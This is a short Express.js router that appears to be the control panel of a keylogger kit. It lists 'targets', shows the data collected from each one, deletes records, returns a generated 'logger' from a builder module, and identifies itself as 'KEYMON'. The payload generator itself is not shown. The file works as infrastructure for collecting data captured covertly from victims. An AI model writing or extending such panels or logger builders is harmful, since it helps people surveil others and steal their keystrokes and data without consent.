const express = require("express")
const router = express.Router()
const { createLogger } = require("../utils/builder")
const { DB } = require("../utils/DB")

router.route("/").get((req, res) => {
    res.render("index", {
        targets: DB.info().collections
    })
})

router.route("/panel").get((req, res) => {
    const { id } = req.query

    res.render("panel", {
        id,
        data: JSON.stringify(DB.collection(id, false).findMany({}))
    })
})

router.route("/panel/del").get((req, res) => {
    const { id } = req.query
    res.send(`Task: ${DB.collection(id).delete()}`)
})

router.route("/create").get((req, res) => {
    res.render("create")
}).post(async (req, res) => {
    const code = await createLogger(req.body)
    res.send(code)
})

router.get("/check", (req, res) => {
    res.send("KEYMON")
})

module.exports = router